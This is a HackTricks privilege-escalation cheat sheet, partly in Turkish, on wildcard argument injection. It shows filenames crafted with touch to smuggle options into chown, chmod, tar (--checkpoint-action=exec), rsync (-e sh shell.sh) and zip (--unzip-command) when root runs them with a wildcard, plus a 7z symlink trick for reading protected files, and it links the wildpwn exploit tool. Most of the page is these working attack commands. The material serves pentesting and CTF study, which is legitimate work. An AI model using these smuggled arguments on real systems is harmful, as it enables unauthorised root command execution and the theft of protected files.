{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## chown, chmod

**Hangi dosya sahibini ve izinlerini diğer dosyalar için kopyalamak istediğinizi belirtebilirsiniz.**
```bash
touch "--reference=/my/own/path/filename"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_\
Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Rasgele komutlar çalıştırın:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar saldırısı)_ kullanılarak istismar edilebilir.\
Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) adresine bakın.

## Rsync

**Rasgele komutlar çalıştırın:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_ kullanılarak istismar edilebilir.\
Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) adresine bakın.

## 7z

**7z** içinde `--` kullanarak `*`'dan önce (not: `--` sonraki girdinin parametre olarak işlenemeyeceği anlamına gelir, bu durumda sadece dosya yolları) rastgele bir hatanın bir dosyayı okumasına neden olabilirsiniz, bu nedenle aşağıdaki gibi bir komut root tarafından çalıştırılıyorsa:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Ve bu işlemin gerçekleştirildiği klasörde dosyalar oluşturabilirsiniz, `@root.txt` dosyasını ve okumak istediğiniz dosyaya **symlink** olan `root.txt` dosyasını oluşturabilirsiniz:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Sonra, **7z** çalıştırıldığında, `root.txt` dosyasını sıkıştırması gereken dosyaların listesini içeren bir dosya olarak ele alacaktır (bu, `@root.txt` varlığının gösterdiği şeydir) ve 7z `root.txt` dosyasını okuduğunda `/file/you/want/to/read` dosyasını okuyacak ve **bu dosyanın içeriği bir dosya listesi olmadığından, bir hata verecektir** içeriği göstererek.

_HackTheBox'tan CTF kutusunun Yazılımlarında daha fazla bilgi._

## Zip

**Rasgele komutlar çalıştır:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
